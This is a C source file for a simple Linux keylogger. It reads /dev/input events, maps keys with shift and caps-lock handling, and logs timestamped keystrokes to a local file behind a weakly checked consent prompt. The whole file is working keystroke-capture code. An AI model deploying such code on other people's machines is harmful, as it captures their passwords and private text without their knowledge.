#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <stdlib.h>
#include <errno.h>


// Structure to hold device and file pointers
typedef struct {
    char device[64];
    int fd;
    FILE *log;
} Logger;

static Logger L = { .fd = -1, .log = NULL };

// Global flags to track modifier keys (0=Released, 1=Pressed)
static int shift_state = 0;
static int ctrl_state = 0;
static int meta_state = 0; 
// caps lock state is a toggle (0=off, 1=on)
static int caps_lock_state = 0;

// --- Key Mapping ---

/**
 * Translating a key scan code to a string based on the shift state or smthn like that.
 * @param c The key scan code (e.g., KEY_A).
 * @return String representation of the key, or NULL if it's a modifier key.
 */
static const char *simple_key(unsigned int c) {
    // 1. modifier keys (return NULL so they don't get logged as events)
    switch (c) {
        case KEY_LEFTSHIFT:
        case KEY_RIGHTSHIFT:
        case KEY_LEFTCTRL:
        case KEY_RIGHTCTRL:
        case KEY_LEFTMETA:
        case KEY_RIGHTMETA:
        case KEY_CAPSLOCK:    return NULL; // ignore capslock press/release event
        default: break;
    }

    // determine final case for letters:
    // case is toggled if (shift is down) XOR (caps lock is on)
    int is_upper = shift_state ^ caps_lock_state;

    // 2. printable keys (handles case sensitivity via is_upper)
    if (is_upper) {
        // upper case letters and shifted symbols
        switch (c) {
            // LETTERS: uppercase
            case KEY_A: return "A"; case KEY_B: return "B"; case KEY_C: return "C";
            case KEY_D: return "D"; case KEY_E: return "E"; case KEY_F: return "F";
            case KEY_G: return "G"; case KEY_H: return "H"; case KEY_I: return "I";
            case KEY_J: return "J"; case KEY_K: return "K"; case KEY_L: return "L";
            case KEY_M: return "M"; case KEY_N: return "N"; case KEY_O: return "O";
            case KEY_P: return "P"; case KEY_Q: return "Q"; case KEY_R: return "R";
            case KEY_S: return "S"; case KEY_T: return "T"; case KEY_U: return "U";
            case KEY_V: return "V"; case KEY_W: return "W"; case KEY_X: return "X";
            case KEY_Y: return "Y"; case KEY_Z: return "Z";
            
            // NUMBERS/SYMBOLS: shifted
            case KEY_1: return "!"; case KEY_2: return "@"; case KEY_3: return "#";
            case KEY_4: return "$"; case KEY_5: return "%"; case KEY_6: return "^";
            
            // SPECIAL KEYS
            case KEY_SPACE: return "[SPACE]"; 
            case KEY_ENTER: return "[ENTER]";
            case KEY_BACKSPACE: return "[BACKSPACE]";
            case KEY_TAB: return "[TAB]";
            case KEY_ESC: return "[ESC]";
            default: return NULL;
        }
    } else {
        // lower case letters and unshifted symbols
        switch (c) {
            // LETTERS: lowercase
            case KEY_A: return "a"; case KEY_B: return "b"; case KEY_C: return "c";
            case KEY_D: return "d"; case KEY_E: return "e"; case KEY_F: return "f";
            case KEY_G: return "g"; case KEY_H: return "h"; case KEY_I: return "i";
            case KEY_J: return "j"; case KEY_K: return "k"; case KEY_L: return "l";
            case KEY_M: return "m"; case KEY_N: return "n"; case KEY_O: return "o";
            case KEY_P: return "p"; case KEY_Q: return "q"; case KEY_R: return "r";
            case KEY_S: return "s"; case KEY_T: return "t"; case KEY_U: return "u";
            case KEY_V: return "v"; case KEY_W: return "w"; case KEY_X: return "x";
            case KEY_Y: return "y"; case KEY_Z: return "z";
            
            // NUMBERS/SYMBOLS: unshifted
            case KEY_1: return "1"; case KEY_2: return "2"; case KEY_3: return "3";
            case KEY_4: return "4"; case KEY_5: return "5"; case KEY_6: return "6";
            
            // SPECIAL KEYS
            case KEY_SPACE: return " "; 
            case KEY_ENTER: return "[ENTER]";
            case KEY_BACKSPACE: return "[BACKSPACE]";
            case KEY_TAB: return "[TAB]";
            case KEY_ESC: return "[ESC]";
            default: return NULL;
        }
    }
}

/**
 * generating a YYYY-MM-DD HH:MM:SS timestamp for the shit.
 */
static void ts(char *buf, size_t n) {
    time_t t = time(NULL);
    struct tm tm;
    localtime_r(&t, &tm);
    strftime(buf, n, "%F %T", &tm);
}

/**
 closes files/descriptors and calls exit().
 */
static void cleanup_and_exit(int code) {
    if (L.log) { 
        fflush(L.log); 
        fclose(L.log); 
        L.log = NULL; 
    }
    if (L.fd >= 0) { 
        close(L.fd); 
        L.fd = -1; 
    }
    if (code == 0) {
        fprintf(stderr, "bye — cleaned up.\n");
    } else {
        fprintf(stderr, "exiting with error code %d\n", code);
    }
    exit(code);
}

/**
 * ctrl+c to exit (good old command).
 */
static void sigint(int s) {
    (void)s;
    fprintf(stderr, "\nsigint received, gracefully exiting...\n");
    cleanup_and_exit(0);
}


// yeah this is where the real shit happens

int main(int argc, char **argv) {
    // checking arguments and prompt for consent before proceeding. (very ethical btw)
    if (argc != 2) {
        fprintf(stderr, "usage: %s /dev/input/eventX\n", argv[0]);
        return 1;
    }

    printf("logger — educational purposes only. run on machines you own or in a vm.\n");
    printf("type 'confirm' to confirm and proceed: ");
    char ans[16];
    if (!fgets(ans, sizeof(ans), stdin)) {
        return 1;
    }
    if (strncmp(ans, "confirm", 3) != 0) { 
        printf("aborting.\n"); 
        return 1; 
    }

    // open device file (requires root access) and log file.
    strncpy(L.device, argv[1], sizeof(L.device)-1);
    L.device[sizeof(L.device)-1] = '\0';

    L.fd = open(L.device, O_RDONLY);
    if (L.fd < 0) { 
        perror("open device"); 
        return 1; 
    }

    L.log = fopen("keystrokes.log", "a");
    if (!L.log) { 
        perror("fopen log file"); 
        close(L.fd); 
        return 1; 
    }

    // cleanup handler for ctrl+c.
    signal(SIGINT, sigint);
    printf("logging... press ctrl+c to stop. output: ./keystrokes.log\n");

    // main event read loop.
    struct input_event ev;
    while (1) {
        ssize_t r = read(L.fd, &ev, sizeof(ev));
        
        if (r == (ssize_t)sizeof(ev)) {
            
            if (ev.type == EV_KEY) {
                
                // --- modifier state tracking ---
                // update the state of shift, control, and meta keys.
                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                    shift_state = ev.value;
                }
                if (ev.code == KEY_LEFTCTRL || ev.code == KEY_RIGHTCTRL) {
                    ctrl_state = ev.value;
                }
                if (ev.code == KEY_LEFTMETA || ev.code == KEY_RIGHTMETA) {
                    meta_state = ev.value;
                }
                
                // update caps lock state: it is a toggle that only changes on press (value == 1)
                if (ev.code == KEY_CAPSLOCK && ev.value == 1) {
                    caps_lock_state = !caps_lock_state;
                }

                // --- log key press/repeat events ---
                // ev.value 1 = press, 2 = repeat.
                if (ev.value == 1 || ev.value == 2) {
                    char timebuf[64];
                    ts(timebuf, sizeof(timebuf));
                    
                    const char *kn = simple_key(ev.code);

                    if (kn) {
                        // log printable/special keys (vertical output enforced by '\n').
                        printf("[%s] %s\n", timebuf, kn);
                        fprintf(L.log, "[%s] %s\n", timebuf, kn); 
                    } else {
                        // log unhandled non-modifier codes for debugging.
                        printf("[%s] [UNHANDLED CODE] %u\n", timebuf, ev.code);
                        fprintf(L.log, "[%s] [UNHANDLED CODE] %u\n", timebuf, ev.code);
                    }
                    
                    fflush(L.log);
                }
            }
        } else if (r < 0) {
            // handle read errors.
            if (errno == EINTR) continue;
            perror("read error");
            break;
        } else {
            // device likely closed or read was partial.
            fprintf(stderr, "device closed or incomplete read (r=%zd). stopping.\n", r);
            break;
        }
    }

    cleanup_and_exit(0);
    return 0; 
}
